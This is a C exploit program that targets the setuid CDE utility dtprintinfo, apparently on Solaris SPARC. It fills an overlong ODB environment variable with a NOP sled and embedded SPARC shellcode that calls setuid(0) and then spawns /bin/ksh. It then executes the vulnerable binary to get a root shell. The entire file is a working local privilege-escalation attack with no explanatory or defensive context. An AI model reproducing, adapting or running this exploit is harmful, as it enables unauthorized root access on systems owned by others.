#include <stdio.h>
#include <string.h>
#define ENVBUF 5000
#define NOPS 200

/* lsd shellcode. */
char shellcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

int
main(int argc,char **argv) {

char *argp[2];
char *envp[6];
char display[128];
char home[4];
char buf[ENVBUF];
int align;

if(argc==3)
   align=atoi(argv[02]);
else
   align=-1;

if(argc<2 || argc>3) {
  printf("usage: %s xserver:display <alignment>\n",argv[0]);
  exit(-1);
 }

else {

sprintf(display,"DISPLAY=%s",argv[1]);
memset(buf,0x41,ENVBUF);
memcpy(home,"HOME=.",strlen("HOME=."));
memset(buf,0x90,NOPS);
memcpy((buf+NOPS)+align,shellcode,strlen(shellcode));
memcpy(buf,"ODB=",4);

envp[0]=(char *)strdup("PATH=.:/usr/bin");
envp[1]=display;
envp[2]=buf;
envp[3]=home;
envp[4]=0;

argp[0]=(char *) strdup("/usr/dt/bin/dtprintinfo");
argp[1]=0;

printf("execve() started.\n");
fflush(0);
execve("/usr/dt/bin/dtprintinfo",argp,envp);
printf("execve() failed.\n");
}
}
